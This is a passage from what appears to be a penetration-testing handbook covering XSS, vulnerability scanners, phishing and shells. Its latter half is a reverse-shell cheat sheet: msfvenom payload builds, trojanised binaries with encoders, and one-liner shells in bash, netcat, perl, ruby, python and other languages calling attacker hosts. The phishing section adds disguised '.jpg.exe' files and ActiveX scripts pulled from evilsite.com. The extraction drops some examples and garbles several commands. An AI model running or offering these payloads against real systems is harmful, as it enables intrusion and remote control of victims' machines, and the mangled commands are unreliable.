The obvious risk is that the attacker must expose a server.
Tools
XSSER
This tool tests a lot of
xsser --gtk
Xssposed
This is a tool found in recon-ng. It basically just check this (https://www.openbugbounty.org/ )
database to see if anyone has reported a xss for the website.
References:
http://brutelogic.com.br/blog/probing-to-find-xss/ http://excess-xss.com/
152
Cross-Site Scripting
153
Cross-Site Scripting
Examples
Examples
This is a good list:
https://www.linkedin.com/pulse/20140812222156-79939846-xss-vectors-you-may-need-as-a-pen-
tester
No security
Imagine that the server sanitizes . To bypass that we can use:  
Using the IMG-tag
Onmouseover
d
154
Cross-Site Scripting
DOM-based XSS
DOM-based XSS
In DOM-based XSS the malicious code is never sent to the server. The injection-point is somewhere
where javascript has access.
The typical example of how this works is with URLs.
The user is able to control the URL with the help of the hash-symbol #. If we add that symbol to a
URL the browser will not include that characters that comes after it in the requet to the server.
https://example.com/#this_is_not_sent_to_server
However, the complete URL is included in DOM-objects.
document.URL
# will generate this output: https://example.com/#this_is_not_sent_to_server
Source
So in order to inject and execute a DOM-based XSS we need a injection-point (called source) and a
point of execution (called sink).
In the example above document.URL is our source. Example of other sources are:
document.URL
document.documentURI
document.URLUnencoded (IE 5.5 or later Only)
document.baseURI
location
location.href
location.search
location.hash
location.pathname
window.name
document.referrer
Sinks
eval
setTimeout
setInterval
setImmediate
execScript
crypto.generateCRMFRequest
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
155
Cross-Site Scripting
anyTag.onEventName
Finding it
To find DOM-based XSS you will need to check out the code.
If the javascript code is bundled and minified you can use js_beautify to make it readble again.
sudo apt-get install libjavascript-beautifier-perl
# then invoke js_beautify
References
https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources
156
Browser Vulnerabilities
Browser Vulnerabilities
Browser vulnerabilities
We have mostly been looking at vulnerabilities found in sites that let's us either attack the user or the
underlying system. But there is also another sort of vulnerability. When the browser itself is
vulnerable and can lead to remote code execution.
And example of this is ms12-036.
XSS and redirection
Most attacks against browsers is based on social engineering. The idea is that you trick the user to
click on a link. That link, or that website, is usually controlled by the attacker in one way or another.
It can be a legitimate site that the attacker is using, or it might be the attackers own server.
Foe example, if the attacker is able to inject code html or javascript the attacker can redirect the user
to load another page.
One technique is to hide the redirection in a frame, this way the user won't even notice that an
external page is being loaded.
A less subtle technique is by just redirecting the user, with a script like this:
157
Automated Vulnerability Scanners
Automated Vulnerability Scanners
Automated Vulnerability Scanners
Everyone on the interwebz that says they know something about pentesting will talk shit about nessus
and say that it is for lazy pentesters, it creates too much noise, and that it produces too many false
positives. That may be true, I don't know. But from a learning perspective it can be really great. It can
help to show you what kind of vulnerabilities are out there. So whatever, do what you want.
Server side scanning
Nessus
Register and download it here. http://www.tenable.com/products/nessus-home
Then
dpkg -i nameOfFile
Start it
/etc/init.d/nessusd start
Nmap Scripting Engine
Scripts are found on kali at:
/usr/share/nmap/scripts
nmap --script-help default
Or for a specific script:
nmap --script-help nameOfScript
Run all default scripts together with a port-scan. These scripts could possibily crash certain servers.
Causing a denial-of-service. So never run this on production servers.
nmap -sC 192.168.1.101
Nmap has categoriesed their scripts into several different categories to make it easier to run a few of
them together
uth
broadcast
default
discovery
dos
exploit
external
fuzzer
158
Automated Vulnerability Scanners
intrusive
malware
safe,
version
vuln
So if you want to test all the vuln-scripts you do
nmap 192.168.1.10 -sC vuln
OpenVas
OpenVas is another popular open-soruce vulnerability scanner.
If you are on Kali linux you have to firt run the initial setup scripts, like this
openvas-setup
Make sure to write down the password that the initialisation-scripts gives you
This will download some stuff and start setting everything up. WHen everything is set up you go to
the web-interface:
https://127.0.0.1:9392/login/login.html
Metasploit Scanner Module
Web Application Scanner
Nikto
nikto -h example.com
Uniscan
uniscan -h 192.168.1.102
Metasploit - Wamp
Found in metasploit
load wamp
help
Read more here https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/
159
Exploiting
Exploiting
Exploiting
So you have done your homework, and done your vulnerability analysis and found several
vulnerabilities. Now it is time to exploit them.
Before you start writing your own exploits you should of course check if there are some already
written.
Do not just grab any exploit on the internetz. If it contains shellcode it might be you that is getting
hacked. On Exploit-db and Security focus they vet the exploits before they are published so it is at
least a bit more secure. But be paranoid, and don't trust shellcode or code that you didn't write.
Exploit-DB Security Focus
160
Social Engineering - Phishing
Social Engineering - Phishing
Social Engineering - Phishing
Gaining initial access to a network is often done using different kinds of social engineering attacks.
Auto-download a malicious file
The techical part is not really that difficult here. In order to auto-download a file you just add this
script to the malicious webpage
Another way to do it is like this
Of course the user will have to accept to download the file, unless the user has previously checked in
the box automatically download. The user must then click the file for it to execute. This is where the
social engineering part comes in, you really must trick the user into executing the file.
Change the filename
Since windows by default remove the filename you can call your file shell.jpg.exe, and once
downloaded onto the machine windows will display it as "shell.jpg".
Embed malicious code in legitimate file
It is however very likely that this will be picked up by a antivirus.
msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe
Autodownload a malicious javascript-file
Just like we can download an exe for a user to can also make that user download a javascript file.
Since javascript files can execute commands on windows.
var oShell = new ActiveXObject("Shell.Application");
var commandtoRun = "C:\\Windows\\system32\\calc.exe";
oShell.ShellExecute(commandtoRun,"","","open","1");
http://evilsite.com/file.js
This code can be modified to greate a wget-script and then download and execute a script.
Phishing
161
Social Engineering - Phishing
The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as
default in Kali. Run it like this:
setoolkit
Spear phishing
Word/excel makros
An explanation of how to createa malicious makro-wordfile.
https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/
Embed a executable inside a PowerPoint
You can embed executables inside PowerPoint presentations and then have them execute about
animations.
Reference:
https://www.youtube.com/watch?v=NTdthBQYa1k
162
Default Layout of Apache on Different Versions
Default Layout of Apache on Different Versions
Default Layout of Apache on Different Versions
Really useful if you want to know what the root-folder is for an apache install:
https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29:
163
Shells
Shells
Reverse-shells
This is s great collection of different types of reverse shells and webshells. Many of the ones listed
below comes from this cheat-sheet:
https://highon.coffee/blog/reverse-shell-cheat-sheet/
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Msfvenom
There is an important difference between non-staged and staged payload. A non-staged shell is sent
over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler.
But also with netcat.
staged shells send them in turn. This can be useful for when you have very small buffer for your
shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts
of it and sets up the connection, and then it sends some more. This can be caught with metasploit
multi-handler but not with netcat.
Windows
Meterpreter
Standard meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
Meterpreter HTTPS
It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is
encrypted and can be used to bypass deep-packet inspections.
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
Non-staged payload
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
use exploit/multi/handler
set payload windows/shell_reverse_tcp
Staged payload
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
164
Shells
This must be caught with metasploit. It does not work with netcat.
use exploit/multi/handler
set payload windows/shell/reverse_tcp
Inject payload into binary
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
Linux
Binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
Bash
0/dev/tcp/192.168.1.101/80; sh &196 2>&196
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
Php
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &3 2>&3");'
Netcat
Bind shell
#Linux
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555
# Windows
nc.exe -nlvp 4444 -e cmd.exe
Reverse shell
# Linux
nc -lvp 5555
nc 192.168.1.101 5555 -e /bin/bash
# Windows
nc -lvp 443
nc.exe 192.168.1.101 443 -e cmd.exe
With -e flag
nc -e /bin/sh ATTACKING-IP 80
/bin/sh | nc ATTACKING-IP 80
Without -e flag
165
Shells
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-
interactive-ttys/
Ncat
Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is
encryption. If you are on a pentestjob you might not want to communicate unencrypted.
Bind
ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
ncat -v 192.168.1.103 5555 --ssl
Telnet
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
Perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat &5 >&5; done"] as String[])
p.waitFor()
Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Web-shells - Platform Independent
PHP
This php-shell is OS-independent. You can use it on both Linux and Windows.
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
WAR
166
Shells
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
167
Webshell
Webshell
Webshell
A webshell is a shell that you can access through the web. This is useful for when you have firewalls
that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to
function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse
shell on other ports since the traffic is hidden in the http traffic.
You have access to different kinds of webshells on Kali here:
/usr/share/webshells